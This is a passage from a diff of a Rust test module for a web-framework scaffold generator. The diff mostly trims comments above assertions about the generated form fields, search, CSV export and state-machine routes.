             routes.contains("mut multipart: autumn_web::extract::Multipart"),
             "{routes}"
@@ -18277,42 +16279,35 @@ async fn main() {
             routes.contains(".save_to_blob_store(&*store, key).await?"),
             "{routes}"
         );
-        // The default code path must not CALL the presign helper (the header
-        // note may still mention `complete_direct_upload()` as an advanced
-        // opt-in — AC5 — so match the invocation, not the bare name).
+        // Match the call, not the name: the header note still mentions
+        // `complete_direct_upload()` as an opt-in.
         assert!(
             !routes.contains("complete_direct_upload(&"),
             "default path must not call the presign helper: {routes}"
         );
         assert!(routes.contains("multipart.next_field().await?"), "{routes}");
 
-        // Preserve-on-update: an edit with no new file keeps the stored blob.
-        // Cloned, not moved, so `current` survives to the unique-violation 422
-        // re-render, which shows the currently stored attachment (issue #1236).
+        // An edit with no new file keeps the stored blob. Cloned, not moved:
+        // the unique-violation 422 re-render still shows `current` (#1236).
         assert!(
             routes.contains("new.avatar = avatar_blob.or(current.avatar.clone());"),
             "{routes}"
         );
-        // Create binds the streamed blob directly (None => NULL column).
         assert!(routes.contains("new.avatar = avatar_blob;"), "{routes}");
 
-        // The attachment is NOT part of the urlencodable form struct any more,
-        // and `into_new` is sync (no `&state`), seeding the blob column to None.
+        // The attachment is not in the form struct; sync `into_new` seeds it to None.
         assert!(routes.contains("pub struct PostForm"));
         assert!(!routes.contains("pub avatar: Option<String>"), "{routes}");
         assert!(!routes.contains("async fn into_new("), "{routes}");
         assert!(routes.contains("fn into_new(form: &PostForm)"), "{routes}");
         assert!(routes.contains("avatar: None,"), "{routes}");
 
-        // The header note documents the zero-JS multipart path and demotes the
-        // presign path to an advanced opt-in.
         assert!(routes.contains("ZERO"), "{routes}");
         assert!(routes.contains("save_to_blob_store"), "{routes}");
         assert!(routes.contains("ADVANCED (opt-in)"), "{routes}");
-        // AC7 (storage + multipart feature auto-enable) needs a real
-        // `autumn-web` dependency line to modify, which this stub-Cargo.toml
-        // harness doesn't provide; it is proven end-to-end by the integration
-        // test `scaffold_attachment_emits_zero_js_multipart_handlers`.
+        // Feature auto-enable needs a real `autumn-web` dependency line; the
+        // integration test `scaffold_attachment_emits_zero_js_multipart_handlers`
+        // covers it.
     }
 
     /// The DSL kinds of issue #3405 for one test model.
@@ -18332,8 +16327,7 @@ async fn main() {
 
     #[test]
     fn execute_maps_native_control_kinds_onto_the_form_helpers() {
-        // Issue #3405: `time`, `phone`, `color` and `money` render the native
-        // control in the standard `form_for` path.
+        // #3405: `time`, `phone`, `color` and `money` render native controls in `form_for`.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -18412,8 +16406,7 @@ async fn main() {
 
     #[test]
     fn execute_maps_native_control_kinds_in_the_live_validation_path() {
-        // Issue #3405: the `--live-validation` per-field path calls the
-        // helpers directly.
+        // #3405: the `--live-validation` path calls the per-field helpers directly.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -18445,10 +16438,8 @@ async fn main() {
 
     #[test]
     fn execute_writes_json_field_textarea_and_parse_on_write() {
-        // Issue #1341 AC1/AC5: `config:json` (required) and `settings:Option<json>`
-        // (nullable) — the generated form renders both as `<textarea>` controls,
-        // and the write path parses the submitted text as JSON, 400ing (not
-        // 500ing) on invalid input rather than deserializing it directly.
+        // #1341: JSON fields render as `<textarea>`; the write path parses the
+        // text and answers invalid JSON with 400, not 500.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -18472,8 +16463,6 @@ async fn main() {
         )
         .unwrap();
 
-        // AC2: the migration emits the JSONB column, `NOT NULL` for the
-        // required field and nullable for the `Option<jsonb>` one.
         assert!(migration.contains("config JSONB NOT NULL"), "{migration}");
         assert!(migration.contains("settings JSONB"), "{migration}");
         assert!(
@@ -18481,8 +16470,7 @@ async fn main() {
             "{migration}"
         );
 
-        // Form control: a real `<textarea>`, not the derived opaque-type
-        // fallback single-line text input.
+        // A real `<textarea>`, overriding the derived single-line text fallback.
         assert!(
             routes
                 .contains(".override_field(\"config\", autumn_web::form::FieldControl::Textarea)"),
@@ -18495,9 +16483,8 @@ async fn main() {
             "{routes}"
         );
 
-        // `PostForm` carries both fields as strings (the browser's wire shape),
-        // never the native `serde_json::Value` (which would silently wrap raw
-        // urlencoded text as a JSON *string* instead of parsing it).
+        // The form holds strings: a `serde_json::Value` field would wrap the raw
+        // urlencoded text as a JSON string instead of parsing it.
         assert!(routes.contains("pub config: String,"), "{routes}");
         assert!(routes.contains("pub settings: Option<String>,"), "{routes}");
         assert!(
@@ -18505,9 +16492,6 @@ async fn main() {
             "{routes}"
         );
 
-        // `into_new` parses via `serde_json::Value`'s `FromStr`, 400ing (not
-        // panicking/500ing) on invalid JSON — the same `bad_request_msg`
-        // pattern as decimal/enum/datetime fields, naming the field.
         assert!(
             routes.contains("form.config.parse::<serde_json::Value>()"),
             "{routes}"
@@ -18518,8 +16502,7 @@ async fn main() {
             ),
             "{routes}"
         );
-        // Nullable: a blank textarea means "no value" (`None`), not a 400 —
-        // filtered before parsing, mirroring the nullable-`DateTime` pattern.
+        // A blank nullable textarea is `None`, not a 400.
         assert!(
             routes.contains("form.settings.as_deref().filter(|value| !value.trim().is_empty())"),
             "{routes}"
@@ -18529,9 +16512,6 @@ async fn main() {
             "{routes}"
         );
 
-        // The generated `#[model]` struct field is the real, native type —
-        // `serde_json::Value`/`Option<serde_json::Value>` — not the form's
-        // `String` shadow, and the diesel `schema.rs` token is `Jsonb`.
         assert!(model.contains("pub config: serde_json::Value,"), "{model}");
         assert!(
             model.contains("pub settings: Option<serde_json::Value>,"),
@@ -18557,9 +16537,7 @@ async fn main() {
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // Bool fields map to a checkbox in the derived `FormModel`
-        // descriptors (issue #1135) — no per-field helper line and no
-        // `form_for` override needed in the routes file.
+        // The derived `FormModel` renders bool as a checkbox (#1135).
         assert!(
             !routes.contains("autumn_web::form::checkbox_input(&changeset"),
             "{routes}"
@@ -18572,8 +16550,7 @@ async fn main() {
             !routes.contains("input type=\"text\" name=\"active\""),
             "bool field must not render input type=\"text\": {routes}"
         );
-        // The form struct must default the bool so an unchecked submission
-        // (missing key) doesn't 400.
+        // An unchecked box sends no key, so the field must default or decoding 400s.
         assert!(
             routes.contains("#[serde(default)]\n    pub active: bool,"),
             "{routes}"
@@ -18582,9 +16559,8 @@ async fn main() {
 
     #[test]
     fn execute_writes_select_for_nullable_bool_field() {
-        // A checkbox can't losslessly represent Option<bool> (no way to
-        // distinguish "leave false" from "set to null" when unchecked), so
-        // nullable bool fields must render a 3-option select instead.
+        // An unchecked checkbox cannot tell false from null, so `Option<bool>`
+        // renders a 3-option select.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -18601,22 +16577,17 @@ async fn main() {
             !routes.contains("input type=\"checkbox\" name=\"archived\""),
             "nullable bool must not render a checkbox: {routes}"
         );
-        // A nullable bool maps to a 3-option select (unset/true/false) in the
-        // derived `FormModel` descriptors (issue #1135) — no per-field helper
-        // line and no `form_for` override needed in the routes file.
+        // The derived `FormModel` renders the select (#1135).
         assert!(
             !routes.contains("autumn_web::form::select_input(&changeset"),
             "{routes}"
         );
-        // …with the flag off. Under `--i18n` the derive's hardcoded
-        // `— Unset —`/`Yes`/`No` are user-facing English that has to be
-        // claimed, so an override IS emitted — see
-        // `a_nullable_bool_translates_its_own_options`.
+        // Without `--i18n` only: there the derive's English option labels need
+        // an override (see `a_nullable_bool_translates_its_own_options`).
         assert!(
             !routes.contains(".override_field(\"archived\""),
             "nullable bool fields need no form_for override: {routes}"
         );
-        // The form field is an Option<bool> so a blank submission stays None.
         assert!(routes.contains("pub archived: Option<bool>,"), "{routes}");
     }
 
@@ -18634,9 +16605,7 @@ async fn main() {
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // Integer fields map to a stepped number control in the derived
-        // `FormModel` descriptors (issue #1135) — no per-field helper line
-        // and no `form_for` override needed in the routes file.
+        // The derived `FormModel` renders integers as a number input (#1135).
         assert!(
             !routes.contains("autumn_web::form::required_number_input(&changeset"),
             "{routes}"
@@ -18671,9 +16640,7 @@ async fn main() {
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // Float fields map to a free-step number control in the derived
-        // `FormModel` descriptors (issue #1135) — no per-field helper line
-        // and no `form_for` override needed in the routes file.
+        // The derived `FormModel` renders floats as a free-step number input (#1135).
         assert!(
             !routes.contains("autumn_web::form::required_number_input(&changeset"),
             "{routes}"
@@ -18688,12 +16655,8 @@ async fn main() {
 
     #[test]
     fn execute_writes_number_input_reads_value_from_changeset() {
-        // A required numeric field is represented as a `String` on the form
-        // (issue #1124 review): `f64::default()` is `0.0`, a real value, not
-        // "blank" — a native-typed field would render `0` as the blank
-        // new-form's pre-filled value instead of leaving the input empty.
-        // `into_new` parses it back, and a bad value is a 400 (undecodable
-        // input), matching the enum/datetime convention.
+        // A required number is a `String` on the form: `f64::default()` would
+        // prefill the new form with `0`. `into_new` parses it; a bad value is a 400.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -18720,18 +16683,14 @@ async fn main() {
             routes.contains("price: row.price.to_string(),"),
             "the edit-form seed copies the float from the row: {routes}"
         );
-        // A nullable float of the same kind keeps its native Option<T> type —
-        // `None` is already blank, no String indirection needed.
+        // A nullable float stays `Option<f32>`: `None` is already blank.
         assert!(routes.contains("pub weight: Option<f32>,"), "{routes}");
     }
 
     #[test]
     fn execute_writes_required_references_field_as_string_on_form() {
-        // A required `references` (foreign key) field is `i64` at the model
-        // layer, same as any other required integer — it needs the same
-        // String-wire treatment as I32/I64/Uuid/Decimal (issue #1124 review):
-        // `i64::default()` is `0`, a real (and likely invalid) foreign key
-        // value, not "blank".
+        // A required foreign key is a `String` on the form like other required
+        // integers: `i64::default()` would prefill `0`, a likely invalid key.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -18758,9 +16717,8 @@ async fn main() {
 
     #[test]
     fn execute_writes_required_bytea_field_as_string_on_form() {
-        // `Vec<u8>` cannot deserialize from a single url-encoded value at all
-        // (issue #1124 review), so the form carries a `String`. That string
-        // is `\x` + hex (issue #2330): lossless, unlike UTF-8.
+        // `Vec<u8>` cannot deserialize from one url-encoded value, so the form
+        // carries a `String` of `\x` + hex (#2330): lossless, unlike UTF-8.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -18891,9 +16849,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // The edit form seeds the changeset from the row; the number control
-        // (from the derived `FormModel` descriptors) reads the value back
-        // through `form_for` (issues #1124/#1135).
         assert!(routes.contains("views: row.views.to_string(),"), "{routes}");
     }
 
@@ -18911,9 +16866,7 @@ async fn main() {
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // Datetime fields map to a datetime-local control in the derived
-        // `FormModel` descriptors (issue #1135) — no per-field helper line
-        // and no `form_for` override needed in the routes file.
+        // The derived `FormModel` renders a datetime-local input (#1135).
         assert!(
             !routes.contains("autumn_web::form::required_datetime_input(&changeset"),
             "{routes}"
@@ -18926,17 +16879,13 @@ async fn main() {
             !routes.contains("input type=\"text\" name=\"published_at\""),
             "{routes}"
         );
-        // On the form the field is a String (the browser wire shape); it's
-        // parsed back into the model type in `into_new`.
         assert!(routes.contains("pub published_at: String,"), "{routes}");
         assert!(
             routes.contains("published_at: parse_local_datetime(&form.published_at)?,"),
             "{routes}"
         );
-        // The edit-form seed formats the row's timestamp for the datetime-local
-        // control, preserving fractional seconds so a no-op resubmit doesn't
-        // truncate the stored value (the update handler writes every column
-        // back unconditionally).
+        // Keep fractional seconds: update writes every column back, so a no-op
+        // resubmit would otherwise truncate the stored value.
         assert!(
             routes.contains(
                 "published_at: row.published_at.format(\"%Y-%m-%dT%H:%M:%S%.f\").to_string(),"
@@ -18959,14 +16908,11 @@ async fn main() {
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
 
-        // The datetime-local control comes from the derived `FormModel`
-        // descriptors (issue #1135) — no per-field line or override needed.
         assert!(
             !routes.contains(".override_field(\"scheduled_at\""),
             "{routes}"
         );
         assert!(routes.contains("pub scheduled_at: String,"), "{routes}");
-        // A tz-aware field parses to naive-local then attaches UTC.
         assert!(
             routes.contains("scheduled_at: parse_local_datetime(&form.scheduled_at)?.and_utc(),"),
             "{routes}"
@@ -18989,8 +16935,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Nullable datetime is an Option<String> on the form, parsed only when
-        // non-empty in `into_new` (issue #1124).
         assert!(
             routes.contains("pub published_at: Option<String>,"),
             "{routes}"
@@ -18999,7 +16943,6 @@ async fn main() {
             routes.contains("form.published_at.as_deref().filter(|value| !value.is_empty())"),
             "{routes}"
         );
-        // The old serde deserialize-with helpers are no longer needed.
         assert!(
             !routes.contains("fn deserialize_option_naive_datetime_local"),
             "{routes}"
@@ -19025,11 +16968,8 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Control selection per kind (text vs checkbox vs number vs
-        // datetime-local, required or not) lives in the derived `FormModel`
-        // descriptors (issue #1135): the routes file renders everything
-        // through the single shared `form_for` helper, with no per-field
-        // helper lines and no overrides for these plain kinds.
+        // The derived `FormModel` picks each control (#1135), so plain kinds need
+        // no per-field helper or override.
         assert!(routes.contains("fn post_form_for("), "{routes}");
         for helper in [
             "text_input",
@@ -19044,7 +16984,6 @@ async fn main() {
             );
         }
         assert!(!routes.contains(".override_field("), "{routes}");
-        // No hand-rolled bare text inputs remain for the non-string fields.
         assert!(
             !routes.contains("input type=\"text\" name=\"active\""),
             "{routes}"
@@ -19214,22 +17153,18 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/accounts.rs")).unwrap();
-        // ShardedDb must be imported from the correct path (not crate root).
         assert!(
             routes.contains("use autumn_web::sharding::ShardedDb;"),
             "sharded routes must import ShardedDb from autumn_web::sharding: {routes}"
         );
-        // Db must NOT appear in the brace-import or as a handler param type.
         assert!(
             !routes.contains("mut db: Db"),
             "sharded routes must not use Db extractor: {routes}"
         );
-        // ShardedDb must be used in handler signatures.
         assert!(
             routes.contains("mut db: ShardedDb"),
             "sharded routes must use ShardedDb in handler signatures: {routes}"
         );
-        // index must call from_shard explicitly for a literal proof.
         assert!(
             routes.contains("from_shard(&db)"),
             "sharded index handler must call from_shard(&db): {routes}"
@@ -19546,9 +17481,8 @@ async fn main() {
             "DB-backed api smoke test must be explicitly ignored with a reason: {test_file}"
         );
         assert!(!test_file.contains("contains(\"Posts\")"));
-        // With a required column (`title:String`), the seed drives 25 rows off
-        // a single `generate_series` and must NOT fall back to `DEFAULT VALUES`
-        // (which cannot satisfy the `NOT NULL` column).
+        // `DEFAULT VALUES` cannot satisfy the `NOT NULL` title column, so the
+        // seed uses `generate_series`.
         assert!(
             test_file.contains("FROM generate_series(1, 25) AS g"),
             "required-column seed must use generate_series: {test_file}"
@@ -19561,13 +17495,9 @@ async fn main() {
 
     #[test]
     fn plan_scaffold_api_only_seeds_default_rows_when_no_required_columns() {
-        // Regression (PR #1707 review): a model with no required (NOT NULL,
-        // no-default) column must still seed 25 rows. The old fix degenerated
-        // to a targetless `INSERT INTO <plural> SELECT FROM generate_series`,
-        // which is INVALID Postgres — a zero-column SELECT is matched against
-        // every column (id included) and fails with a column-count mismatch.
-        // The seed must instead emit 25 valid all-default `DEFAULT VALUES`
-        // inserts, one per `db.execute_sql(...)` call.
+        // With no required column there is nothing to select. A targetless
+        // `INSERT INTO t SELECT FROM generate_series` is invalid Postgres (column
+        // count mismatch), so the seed issues 25 `DEFAULT VALUES` inserts.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -19583,7 +17513,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
         let test_file = fs::read_to_string(tmp.path().join("tests/widget.rs")).unwrap();
         assert!(test_file.contains("/api/widgets"));
-        // The invalid targetless form must never be emitted.
         assert!(
             !test_file.contains("SELECT FROM generate_series"),
             "must not emit the invalid targetless generate_series seed: {test_file}"
@@ -19592,7 +17521,6 @@ async fn main() {
             !test_file.contains("generate_series"),
             "no-required-column seed must not use generate_series at all: {test_file}"
         );
-        // Exactly 25 valid all-default inserts, each in its own execute_sql call.
         assert_eq!(
             test_file
                 .matches("db.execute_sql(\"INSERT INTO widgets DEFAULT VALUES;\").await;")
@@ -19600,7 +17528,7 @@ async fn main() {
             25,
             "expected 25 DEFAULT VALUES inserts (one per row): {test_file}"
         );
-        // Envelope assertions stay consistent with a 25-row seed at size = 2.
+        // 25 rows at page size 2.
         assert!(test_file.contains("total_elements\"], 25"));
         assert!(test_file.contains("total_pages\"], 13"));
     }
@@ -19746,7 +17674,6 @@ async fn main() {
             err.to_string().to_lowercase().contains("uuid"),
             "error must name uuid as unsupported: {err}"
         );
-        // No files written: the scaffold plan fails before touching the tree.
         assert!(
             !tmp.path().join("src/models/post.rs").exists()
                 && !tmp.path().join("src/repositories/post.rs").exists(),
@@ -19763,9 +17690,7 @@ async fn main() {
     #[test]
     fn searchable_with_owner_scoped_model_emits_scoped_wiring() {
         let tmp = project_with_main(default_main());
-        // `user_id` is an owner column, so the default policy makes the index
-        // owner-scoped (`authorize_wiring`). Pairing that with `--searchable`
-        // is now supported via the macro's owner-scoped codegen.
+        // `user_id` is an owner column, so the default policy owner-scopes the index.
         let plan = plan_scaffold_with_options(
             tmp.path(),
             "Post",
@@ -19786,15 +17711,14 @@ async fn main() {
         .expect("standard owner-scoped + searchable must be allowed (#1841)");
         plan.execute(Flags::default()).unwrap();
 
-        // The repository declares `owner = user_id` so the macro generates the
-        // scoped methods.
+        // `owner = user_id` makes the macro generate the scoped methods.
         let repo = fs::read_to_string(tmp.path().join("src/repositories/post.rs")).unwrap();
         assert!(
             repo.contains(", owner = user_id"),
             "owner-scoped repository must carry `owner = user_id` on the attr: {repo}"
         );
-        // Warden 2026-09-13: `owner = ...` alone does not gate `api = "..."`'s
-        // CRUD routes — the scaffold must also wire in the generated policy.
+        // `owner = ...` alone does not gate the `api = "..."` CRUD routes; the
+        // generated policy must be wired in too.
         assert!(
             repo.contains(", policy = PostPolicy)")
                 && repo.contains("use crate::policies::post::PostPolicy;"),
@@ -19802,24 +17726,19 @@ async fn main() {
         );
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // The `/search` route uses the scoped method (and its empty-query
-        // fallback the scoped list) — never the unscoped `search_page`/`page`.
         assert!(
             routes.contains("repo.search_page_scoped(owner_id, q, &page_req)"),
             "owner-scoped /search must call search_page_scoped: {routes}"
         );
-        // The owner-scoped index uses the scoped list with sort/filter.
         assert!(
             routes.contains("repo.list_scoped(owner_id, &list_query, &page_req)"),
             "owner-scoped index/search must call list_scoped: {routes}"
         );
-        // Sort/filter data_table wiring is present on the owner-scoped standard
-        // index (active_sort / query), closing the #1854 gap.
+        // #1854: the owner-scoped index keeps sort/filter.
         assert!(
             routes.contains(".active_sort(list_query.sort().unwrap_or_default())"),
             "owner-scoped standard index must render the sort/filter data_table: {routes}"
         );
-        // The search box is rendered on the owner-scoped index.
         assert!(
             routes.contains("active_search_input"),
             "owner-scoped searchable index must render the search box: {routes}"
@@ -19971,17 +17890,16 @@ async fn main() {
         );
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Input-only `active_search_input` (the composite `active_search` would
-        // render its own empty results container — a duplicate id).
+        // Input-only: the composite `active_search` renders its own results
+        // container, which would duplicate the id.
         assert!(
             routes.contains("active_search_input(\"post-search\"")
                 && !routes.contains("widgets::active_search(\"post-search\"")
                 && routes.contains("\"/posts/search\", \"#posts-search-results\""),
             "index must render the input-only search box wired to the results route: {routes}"
         );
-        // The `active_search` target must exist as a real element that renders
-        // the initial list server-side (no `.initial_load()` AJAX round-trip, no
-        // `<noscript>` fallback wrapper), exactly once on the index page.
+        // The results target renders the initial list server-side, so no
+        // `.initial_load()` round-trip or `<noscript>` fallback is needed.
         assert!(
             routes.contains("div id=\"posts-search-results\"")
                 && !routes.contains(".initial_load(")
@@ -20003,8 +17921,7 @@ async fn main() {
                 && routes.contains("repo.search_page(q, &page_req)"),
             "a search results handler must call search_page: {routes}"
         );
-        // The results pager must preserve the request query (so `q` survives
-        // pagination) instead of pointing at a bare `/posts/search`.
+        // The pager keeps the query string so `q` survives pagination.
         assert!(
             routes.contains("PagerOptions::new(\"/posts/search\").query(pager_query)"),
             "search pager must preserve the query string across pages: {routes}"
@@ -20093,8 +18010,8 @@ async fn main() {
 
     #[test]
     fn kind_is_sortable_excludes_blobs_and_enums() {
-        // #1126: only kinds the model macro emits a sort arm for get a
-        // `.sortable(..)` header — otherwise the link would be a dead affordance.
+        // #1126: only kinds the model macro can sort get a `.sortable(..)` header;
+        // any other would be a dead link.
         assert!(kind_is_sortable(FieldKind::String));
         assert!(kind_is_sortable(FieldKind::Text));
         assert!(kind_is_sortable(FieldKind::I32));
@@ -20108,12 +18025,10 @@ async fn main() {
             precision: 12,
             scale: 2
         }));
-        // Excluded: binary blobs and closed-set enums.
         assert!(!kind_is_sortable(FieldKind::Bytea));
         assert!(!kind_is_sortable(FieldKind::Attachment));
         assert!(!kind_is_sortable(FieldKind::Enum));
-        // Issue #1341: `serde_json::Value` isn't in the `#[model]` macro's
-        // orderable allowlist either.
+        // `serde_json::Value` is not in the `#[model]` orderable allowlist (#1341).
         assert!(!kind_is_sortable(FieldKind::Json));
     }
 
@@ -20132,14 +18047,10 @@ async fn main() {
 
     #[test]
     fn csv_value_expr_never_stringifies_an_option_as_none() {
-        // #1315 AC7: a nullable column must land on `unwrap_or_default()`, i.e.
-        // the empty string. A missing arm is what would silently export the
-        // literal `None` into a spreadsheet cell.
+        // #1315: a nullable column exports as an empty cell, never the literal `None`.
         //
-        // The list below is every `FieldKind` that exists today; `csv_value_expr`
-        // ends in catch-all arms, so a NEW kind would be covered by fallthrough
-        // and silently uncovered here. Add it to this list when you add it to the
-        // enum — same convention as `kind_is_sortable_excludes_blobs_and_enums`.
+        // `csv_value_expr` ends in catch-all arms, so a new `FieldKind` would pass
+        // untested. Add each new kind to this list.
         for kind in [
             FieldKind::String,
             FieldKind::Text,
@@ -20163,9 +18074,7 @@ async fn main() {
             },
         ] {
             let expr = csv_value_expr(&csv_test_field("col", kind, true));
-            // `unwrap_or_default()` closes the value expression itself; a
-            // text-backed kind then wraps it in the `csv_text_cell` guard, so
-            // the trailing `)` may belong to that wrapper.
+            // Text kinds wrap the value in `csv_text_cell(...)`; strip it first.
             let unwrapped = expr
                 .strip_prefix("csv_text_cell(")
                 .and_then(|rest| rest.strip_suffix(')'))
@@ -20190,12 +18099,10 @@ async fn main() {
 
     #[test]
     fn csv_value_expr_handles_the_kinds_without_a_display_impl() {
-        // `Blob` and `Vec<u8>` have no `Display`, so a bare `.to_string()`
-        // would not compile. Attachment is ALWAYS `Option<Blob>`, hence the
-        // same expression whether or not the field was declared nullable.
-        // The attachment key carries the `csv_text_cell` guard: it ends in a
-        // browser-supplied filename and can begin with `=`. A `Bytea` is
-        // `\x` + hex (issue #2330), which cannot, so it takes no guard.
+        // `Blob` and `Vec<u8>` have no `Display`. An attachment is always
+        // `Option<Blob>`, so nullability does not change its expression. Its key
+        // ends in a browser-supplied filename that can begin with `=`, so it gets
+        // the `csv_text_cell` guard; `Bytea` is `\x` + hex (#2330) and needs none.
         let attachment = csv_value_expr(&csv_test_field("cover", FieldKind::Attachment, false));
         assert_eq!(
             attachment,
@@ -20213,9 +18120,8 @@ async fn main() {
             csv_value_expr(&csv_test_field("payload", FieldKind::Bytea, true)),
             "self.payload.as_deref().map(bytea_to_hex).unwrap_or_default()"
         );
-        // An `Enum` column's Rust type is the generated enum, NOT `String`
-        // (see `Field::rust_type`), so it must take the `Display` arm rather
-        // than the `.clone()` one — `.clone()` there yields the wrong type.
+        // An `Enum` column is the generated enum, not `String`, so `.clone()`
+        // would yield the wrong type; it takes the `Display` arm.
         assert_eq!(
             csv_value_expr(&csv_test_field("status", FieldKind::Enum, false)),
             "self.status.to_string()"
@@ -20224,10 +18130,8 @@ async fn main() {
 
     #[test]
     fn csv_value_expr_json_uses_display_and_carries_the_formula_guard() {
-        // Issue #1341: `serde_json::Value` DOES implement `Display` (unlike
-        // `Blob`/`Vec<u8>`), so it falls through to the generic `.to_string()`
-        // arm — but is still wrapped in `csv_text_cell` (`csv_kind_is_text`),
-        // defensively guarding the rare top-level-negative-number case.
+        // #1341: `serde_json::Value` implements `Display`, so it uses `.to_string()`.
+        // It still gets `csv_text_cell`, since a top-level negative number starts with `-`.
         assert_eq!(
             csv_value_expr(&csv_test_field("config", FieldKind::Json, false)),
             "csv_text_cell(self.config.to_string())"
@@ -20241,9 +18145,8 @@ async fn main() {
 
     #[test]
     fn csv_schema_impl_headers_and_record_stay_the_same_length() {
-        // `export_csv` writes `csv_columns()` as the header row and
-        // `to_csv_record()` as each data row: a length mismatch is a runtime
-        // `UnequalLengths` error on the very first export.
+        // `export_csv` writes `csv_columns()` as the header and `to_csv_record()`
+        // per row; a length mismatch fails the first export with `UnequalLengths`.
         let fields = vec![
             csv_test_field("title", FieldKind::String, false),
             csv_test_field("views", FieldKind::I64, true),
@@ -20272,7 +18175,6 @@ async fn main() {
                 .count(),
             "csv_columns and to_csv_record must have one entry each:\n{rendered}"
         );
-        // id first, created_at last, declared columns in between.
         assert!(
             headers.starts_with("\"id\"") && headers.ends_with("\"created_at\""),
             "{headers}"
@@ -20281,8 +18183,6 @@ async fn main() {
 
     #[test]
     fn index_wires_allowlisted_sort_filter() {
-        // #1126: the generated index extracts ListQuery, calls repo.list, and
-        // marks scalar columns sortable with a symmetric data_table config.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -20386,7 +18286,6 @@ async fn main() {
         .unwrap();
         plan.execute(Flags::default()).unwrap();
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // Live variant must keep the ul/li SSE contract intact
         assert!(routes.contains("ul id=\"posts-list\""), "{routes}");
         assert!(routes.contains("sse-connect=(paths::events())"), "{routes}");
     }
@@ -20452,12 +18351,10 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // show handler references property_list widget
         assert!(
             routes.contains("autumn_web::widgets::property_list"),
             "show must use property_list widget: {routes}"
         );
-        // Each declared field appears with humanized label
         assert!(
             routes.contains("\"Title\""),
             "show must list 'title' field: {routes}"
@@ -20470,7 +18367,6 @@ async fn main() {
             routes.contains("\"Published\""),
             "show must list 'published' field: {routes}"
         );
-        // id and created_at always present
         assert!(routes.contains("\"Id\""), "show must include id: {routes}");
         assert!(
             routes.contains("\"Created at\""),
@@ -20494,7 +18390,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
-        // humanized: first word capitalized, rest lowercase (snake_case → "Word rest")
         assert!(
             routes.contains("\"Published at\""),
             "humanize must produce 'Published at': {routes}"
@@ -20507,8 +18402,7 @@ async fn main() {
 
     #[test]
     fn show_includes_defaulted_fields_in_property_list() {
-        // Regression test: fields with `#[default]` are excluded from the
-        // form (form_fields), but must still appear in the show property list.
+        // `#[default]` fields are left off the form but still shown.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold_with_options(
             tmp.path(),
@@ -20537,9 +18431,8 @@ async fn main() {
 
     #[test]
     fn scaffold_without_state_machine_emits_no_transition_wiring() {
-        // AC5: a model WITHOUT any `:states(…)` field keeps the pre-#1326 `show`
-        // handler and route set byte-for-byte — no `show_view` helper, no
-        // `/transitions/` route, and the original three-arg `show` signature.
+        // Without a `:states(…)` field, `show` and the routes stay as they were
+        // before #1326.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -20563,7 +18456,6 @@ async fn main() {
             !routes.contains("transition_controls"),
             "no-state-machine scaffold must not render transition controls: {routes}"
         );
-        // The original inline `show` signature is unchanged (no CSRF params).
         assert!(
             routes.contains(
                 "pub async fn show(id: Path<i64>, mut db: Db, flash: Flash) -> AutumnResult<Markup> {"
@@ -20574,9 +18466,6 @@ async fn main() {
 
     #[test]
     fn scaffold_with_state_machine_emits_transition_route_and_controls() {
-        // A model WITH a `:states(…)` field generates the transition route, the
-        // `transition_{field}_to` call, both the 303 success and 422 error
-        // branches, a shared `show_view`, and a `transition_controls(` call.
         let tmp = project_with_main(default_main());
         let plan = plan_scaffold(
             tmp.path(),
@@ -20591,7 +18480,6 @@ async fn main() {
         plan.execute(Flags::default()).unwrap();
 
         let routes = fs::read_to_string(tmp.path().join("src/routes/orders.rs")).unwrap();
-        // The transition route: `POST /orders/{id}/transitions/status`.
         assert!(
             routes.contains("#[post(\"/orders/{id}/transitions/status\")]"),
             "must emit the transition POST route: {routes}"
@@ -20600,41 +18488,32 @@ async fn main() {
             routes.contains("pub async fn transition_status("),
             "must emit the transition handler: {routes}"
         );
-        // The handler drives the macro-emitted state-machine method.
         assert!(
             routes.contains("row.transition_status_to(&target)"),
             "transition handler must call transition_status_to: {routes}"
         );
-        // Success branch: 303 redirect to the show page.
         assert!(
